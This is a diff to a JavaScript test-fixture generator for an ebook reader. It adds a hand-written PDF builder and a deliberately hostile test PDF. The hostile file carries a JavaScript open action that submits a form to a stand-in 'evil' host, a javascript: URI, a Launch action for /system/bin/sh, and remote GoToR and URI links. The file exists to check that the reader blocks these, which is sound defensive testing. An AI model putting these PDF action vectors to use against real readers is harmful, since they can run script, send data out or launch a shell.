@@ -271,6 +271,67 @@ function zipFiles(out, files) {
 const prose = (n) => Array.from({ length: n }, (_, i) => `Paragraph ${i + 1}. ${para}`)
 
 /** tscover.epub (a non-linear cover first), tsfixed.epub (pre-paginated text), tsthree.cbz, tsformat.epub, tsformat.mobi, tsdrm.mobi (the same with the DRM flag), tsformat.fb2, tsformat.fbz, tsformat.cbz (2 pages). */
+/**
+ * A PDF written by hand (#1128 S5): `pages` text pages (Helvetica, not embedded), each saying
+ * "Page N. Sphinx…". `annots[i]` (raw dictionaries) go on page i+1 as link annotations, `openAction` (a
+ * raw action dictionary) runs on open in a reader that runs actions. Offsets computed, so the xref is real.
+ */
+export function pdf(pages, { title = 'TS PDF', annots = [], openAction = '', cjk = false } = {}) {
+  const objs = []
+  const add = (body) => objs.push(body) && objs.length
+  const catalog = add('')
+  const tree = add('')
+  // `cjk`: a Type0 font on the predefined UniGB-UCS2-H cMap, not embedded: without pdf.js's built-in cMaps
+  // its text neither draws nor extracts.
+  const font = cjk
+    ? add(`<< /Type /Font /Subtype /Type0 /BaseFont /STSong-Light /Encoding /UniGB-UCS2-H /DescendantFonts [${objs.length + 2} 0 R] >>`)
+    : add('<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>')
+  if (cjk) {
+    add(`<< /Type /Font /Subtype /CIDFontType0 /BaseFont /STSong-Light /CIDSystemInfo << /Registry (Adobe) /Ordering (GB1) /Supplement 4 >> /FontDescriptor ${objs.length + 2} 0 R >>`)
+    add('<< /Type /FontDescriptor /FontName /STSong-Light /Flags 6 /FontBBox [0 -200 1000 900] /ItalicAngle 0 /Ascent 880 /Descent -120 /CapHeight 880 /StemV 93 >>')
+  }
+  const kids = []
+  for (let n = 1; n <= pages; n++) {
+    // CJK: "中文" (U+4E2D U+6587) as UCS-2 code units.
+    const text = cjk ? 'BT /F1 28 Tf 40 760 Td <4E2D6587> Tj ET'
+      : `BT /F1 14 Tf 40 760 Td (Page ${n}. Sphinx of black quartz, judge my vow.) Tj 0 -20 Td (The quick brown fox jumps over the lazy dog.) Tj ET`
+    const content = add(`<< /Length ${text.length} >>\nstream\n${text}\nendstream`)
+    const annotRefs = (annots[n - 1] ?? []).map((a) => `${add(a)} 0 R`)
+    kids.push(add(`<< /Type /Page /Parent ${tree} 0 R /MediaBox [0 0 600 800] /Resources << /Font << /F1 ${font} 0 R >> >> /Contents ${content} 0 R${annotRefs.length ? ` /Annots [${annotRefs.join(' ')}]` : ''} >>`))
+  }
+  objs[tree - 1] = `<< /Type /Pages /Kids [${kids.map((k) => `${k} 0 R`).join(' ')}] /Count ${pages} >>`
+  objs[catalog - 1] = `<< /Type /Catalog /Pages ${tree} 0 R${openAction ? ` /OpenAction ${openAction}` : ''} >>`
+  const info = add(`<< /Title (${title}) /Author (Test Author) >>`)
+  let out = '%PDF-1.4\n'
+  const offsets = objs.map((body, i) => { const at = out.length; out += `${i + 1} 0 obj\n${body}\nendobj\n`; return at })
+  const xref = out.length
+  out += `xref\n0 ${objs.length + 1}\n0000000000 65535 f \n${offsets.map((o) => `${String(o).padStart(10, '0')} 00000 n \n`).join('')}`
+  out += `trailer\n<< /Size ${objs.length + 1} /Root ${catalog} 0 R /Info ${info} 0 R >>\nstartxref\n${xref}\n%%EOF\n`
+  return Buffer.from(out, 'latin1')
+}
+
+/**
+ * The hostile PDF (#1128 S5): every way a PDF asks a reader to run script or leave the file. A JavaScript
+ * OpenAction and a JavaScript link (pdf.js runs PDF scripts only in its scripting sandbox, never shipped
+ * here), a `javascript:` URI, a Launch action, a GoToR to a sibling file, and an http URI link (the one the
+ * page may forward as `openLink`, never navigate to). Rects: page 1, one row of links per vector.
+ */
+export function hostilePdf(evil) {
+  const js = '(window.top.__pwned = 1; this.submitForm("' + evil + '/js"))'
+  const link = (y, action) => `<< /Type /Annot /Subtype /Link /Rect [40 ${y} 560 ${y + 20}] /Border [0 0 0] /A ${action} >>`
+  return pdf(2, {
+    title: 'TS HOSTILE PDF',
+    openAction: `<< /S /JavaScript /JS ${js} >>`,
+    annots: [[
+      link(700, `<< /S /JavaScript /JS ${js} >>`),
+      link(660, '<< /S /URI /URI (javascript:window.top.__pwned=1) >>'),
+      link(620, '<< /S /Launch /F (/system/bin/sh) >>'),
+      link(580, `<< /S /GoToR /F (${evil}/gotor.pdf) /D [0 /Fit] >>`),
+      link(540, `<< /S /URI /URI (${evil}/uri) >>`),
+    ]],
+  })
+}
+
 export function writeFormatFixtures(dir) {
   epub(resolve(dir, 'tsformat.epub'), 'TS EPUB', {
     files: { 's1.xhtml': xhtml('', `<h1>Chapter One</h1>${prose(30).map((p) => `<p>${p}</p>`).join('')}`) },
@@ -305,7 +366,10 @@ export function writeFormatFixtures(dir) {
   })
   // Three pages: the 2nd and 3rd share a spread in a landscape view (foliate pairs pages after the first).
   zipFiles(resolve(dir, 'tsthree.cbz'), { 'p01.png': png(60, 80, [200, 40, 40]), 'p02.png': png(60, 80, [40, 200, 40]), 'p03.png': png(60, 80, [40, 40, 200]) })
-  return ['tscover.epub', 'tsfixed.epub', 'tsthree.cbz', 'tsformat.epub', 'tsformat.mobi', 'tsdrm.mobi', 'tsformat.fb2', 'tsformat.fbz', 'tsformat.cbz', 'tsupper.cbz', 'tsutf16.fb2', 'tskf8.mobi', 'tscombo.mobi']
+  // Five text pages (#1128 S5): open, page, select, resume.
+  writeFileSync(resolve(dir, 'tsformat.pdf'), pdf(5))
+  writeFileSync(resolve(dir, 'tscjk.pdf'), pdf(1, { title: 'TS CJK', cjk: true }))
+  return ['tsformat.pdf', 'tscjk.pdf', 'tscover.epub', 'tsfixed.epub', 'tsthree.cbz', 'tsformat.epub', 'tsformat.mobi', 'tsdrm.mobi', 'tsformat.fb2', 'tsformat.fbz', 'tsformat.cbz', 'tsupper.cbz', 'tsutf16.fb2', 'tskf8.mobi', 'tscombo.mobi']
 }
 
 if (process.argv[1] === fileURLToPath(import.meta.url)) {
